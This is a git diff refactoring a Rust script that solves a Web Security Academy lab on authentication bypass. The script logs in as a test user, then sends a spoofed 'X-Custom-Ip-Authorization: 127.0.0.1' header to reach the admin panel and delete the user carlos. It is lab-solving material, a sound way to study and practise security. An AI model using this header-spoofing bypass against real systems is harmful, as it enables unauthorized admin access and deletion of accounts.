@@ -1,123 +1,73 @@
-/********************************************************************
-*
-* Author: Ahmed Elqalaawy (@elqal3awii)
-*
-* Date: 3/9/2023
+/**************************************************************
 *
 * Lab: Authentication bypass via information disclosure
 *
-* Steps: 1. Fetch /login page
-*        2. Extract the session and the csrf token
-*        3. Login as wiener
-*        4. Extract the new session
-*        5. Bypass admin access using custom header
-*        6. Delete carlos
+* Hack Steps: 
+*      1. Fetch the login page
+*      2. Extract the session and the csrf token
+*      3. Login as wiener
+*      4. Extract the new session
+*      5. Delete carlos from the admin panel bypassing access 
+*         using a custom header
 *
-*********************************************************************/
-#![allow(unused)]
-/***********
-* Imports
-***********/
+***************************************************************/
+use lazy_static::lazy_static;
 use regex::Regex;
 use reqwest::{
     blocking::{Client, ClientBuilder, Response},
-    header::HeaderMap,
     redirect::Policy,
 };
-use select::{document::Document, predicate::Attr, predicate::Name};
-use std::{collections::HashMap, time::Duration};
+use select::{document::Document, predicate::Attr};
+use std::{
+    collections::HashMap,
+    io::{self, Write},
+    time::Duration,
+};
 use text_colorizer::Colorize;
 
-/******************
-* Main Function
-*******************/
-fn main() {
-    // change this to your lab URL
-    let url = "https://0abb003303fd7bae82b4b248009700d8.web-security-academy.net";
+// Change this to your lab URL
+const LAB_URL: &str = "https://0a0f00f6043e20ec822c02080061002f.web-security-academy.net";
 
-    // build the client that will be used for all subsequent requests
-    let client = build_client();
-
-    // try to GET /login page
-    let get_login = client
-        .get(format!("{url}/login"))
-        .send()
-        .expect(&format!("{}", "[!] Failed to GET /login".red()));
-
-    println!("{} {}", "⦗1⦘ Fetching /login page..".white(), "OK".green());
-
-    // extract the session
-    let session = extract_session_cookie(get_login.headers())
-        .expect(&format!("{}", "[!] Failed to extract the session".red()));
-
-    // extract the csrf
-    let csrf =
-        extract_csrf(get_login).expect(&format!("{}", "[!] Failed to extract the token".red()));
-
-    println!(
-        "{} {}",
-        "⦗2⦘ Getting session and csrf token..".white(),
-        "OK".green()
-    );
-
-    // try to login as wiener
-    let post_login = client
-        .post(format!("{url}/login"))
-        .form(&HashMap::from([
-            ("username", "wiener"),
-            ("password", "peter"),
-            ("csrf", &csrf),
-        ]))
-        .header("Cookie", format!("session={session}"))
-        .send()
-        .expect(&format!("{}", "[!] Failed to login".red()));
-
-    println!("{} {}", "⦗3⦘ Logging in as wiener..".white(), "OK".green());
-
-    // extract the new session
-    let new_session = extract_session_cookie(post_login.headers()).expect(&format!(
-        "{}",
-        "[!] Failed to extract the new session".red()
-    ));
-
-    println!(
-        "{} {}",
-        "⦗4⦘ Getting a new session as wiener ..".white(),
-        "OK".green()
-    );
-    println!(
-        "{} {}",
-        "⦗5⦘ Bypassing admin access using custom header..".white(),
-        "OK".green()
-    );
-
-    // try to delete carlos
-    // bypass the admin access using a custom header
-    client
-        .get(format!("{url}/admin/delete?username=carlos"))
-        .header("Cookie", format!("session={new_session}"))
-        .header("X-Custom-Ip-Authorization", "127.0.0.1")
-        .send()
-        .expect(&format!(
-            "{}",
-            "[!] Failed to delete carlos from the admin panel".red()
-        ));
-
-    println!("{} {}", "⦗6⦘ Deleting carlos..".white(), "OK".green());
-    println!(
-        "{} {}",
-        "🗹 The lab should be marked now as"
-            .white()
-            .bold(),
-        "solved".green().bold()
-    )
+lazy_static! {
+    static ref WEB_CLIENT: Client = build_web_client();
 }
 
-/*******************************************************************
-* Function used to build the client
-* Return a client that will be used in all subsequent requests
-********************************************************************/
-fn build_client() -> Client {
+fn main() {
+    print!("⦗1⦘ Fetching the login page.. ");
+    flush_terminal();
+
+    let get_login = fetch("/login");
+
+    println!("{}", "OK".green());
+    print!("⦗2⦘ Getting session and csrf token.. ");
+    flush_terminal();
+
+    let session = get_session_cookie(&get_login);
+    let csrf_token = get_csrf_token(get_login);
+
+    println!("{}", "OK".green());
+    print!("⦗3⦘ Logging in as wiener.. ");
+    flush_terminal();
+
+    let login_as_wiener = login_as_wiener(&session, &csrf_token);
+
+    println!("{}", "OK".green());
+    print!("⦗4⦘ Getting a new session as wiener.. ");
+    flush_terminal();
+
+    let new_session = get_session_cookie(&login_as_wiener);
+
+    println!("{}", "OK".green());
+    print!("⦗5⦘ Deleting carlos from the admin panel bypassing access using a custom header.. ");
+    flush_terminal();
+
+    delete_carlos(&new_session);
+
+    println!("{}", "OK".green());
+    println!("🗹 The lab should be marked now as {}", "solved".green())
+}
+
+fn build_web_client() -> Client {
     ClientBuilder::new()
         .redirect(Policy::none())
         .connect_timeout(Duration::from_secs(5))
@@ -125,40 +75,63 @@ fn build_client() -> Client {
         .unwrap()
 }
 
-/*************************************************
-* Function to extract csrf from the response body
-**************************************************/
-fn extract_csrf(res: Response) -> Option<String> {
-    if let Some(csrf) = Document::from(res.text().unwrap().as_str())
+fn fetch(path: &str) -> Response {
+    WEB_CLIENT
+        .get(format!("{LAB_URL}{path}"))
+        .send()
+        .expect(&format!("⦗!⦘ Failed to fetch: {}", path.red()))
+}
+
+fn login_as_wiener(session: &str, csrf_token: &str) -> Response {
+    WEB_CLIENT
+        .post(format!("{LAB_URL}/login"))
+        .form(&HashMap::from([
+            ("username", "wiener"),
+            ("password", "peter"),
+            ("csrf", csrf_token),
+        ]))
+        .header("Cookie", format!("session={session}"))
+        .send()
+        .expect(&format!("{}", "⦗!⦘ Failed to login".red()))
+}
+
+fn delete_carlos(session: &str) {
+    WEB_CLIENT
+        .get(format!("{LAB_URL}/admin/delete?username=carlos"))
+        .header("Cookie", format!("session={session}"))
+        .header("X-Custom-Ip-Authorization", "127.0.0.1")
+        .send()
+        .expect(&format!(
+            "{}",
+            "⦗!⦘ Failed to delete carlos from the admin panel".red()
+        ));
+}
+
+fn get_csrf_token(response: Response) -> String {
+    let document = Document::from(response.text().unwrap().as_str());
+    document
         .find(Attr("name", "csrf"))
         .find_map(|f| f.attr("value"))
-    {
-        Some(csrf.to_string())
-    } else {
-        None
-    }
+        .expect(&format!("{}", "⦗!⦘ Failed to get the csrf".red()))
+        .to_string()
 }
 
-/**********************************************************
-* Function to extract session field from the cookie header
-***********************************************************/
-fn extract_session_cookie(headers: &HeaderMap) -> Option<String> {
-    let cookie = headers.get("set-cookie").unwrap().to_str().unwrap();
-    if let Some(session) = capture_pattern("session=(.*); Secure", cookie) {
-        Some(session.as_str().to_string())
-    } else {
-        None
-    }
+fn get_session_cookie(response: &Response) -> String {
+    let headers = response.headers();
+    let cookie_header = headers.get("set-cookie").unwrap().to_str().unwrap();
+    capture_pattern_from_text("session=(.*); Secure", cookie_header)
 }
 
-/********************************************
-* Function to capture a pattern form a text
-*********************************************/
-fn capture_pattern(pattern: &str, text: &str) -> Option<String> {
-    let pattern = Regex::new(pattern).unwrap();
-    if let Some(text) = pattern.captures(text) {
-        Some(text.get(1).unwrap().as_str().to_string())
-    } else {
-        None
-    }
+fn capture_pattern_from_text(pattern: &str, text: &str) -> String {
+    let regex = Regex::new(pattern).unwrap();
+    let captures = regex.captures(text).expect(&format!(
+        "⦗!⦘ Failed to capture the pattern: {}",
+        pattern.red()
+    ));
+    captures.get(1).unwrap().as_str().to_string()
+}
+
+#[inline(always)]
+fn flush_terminal() {
+    io::stdout().flush().unwrap();
 }
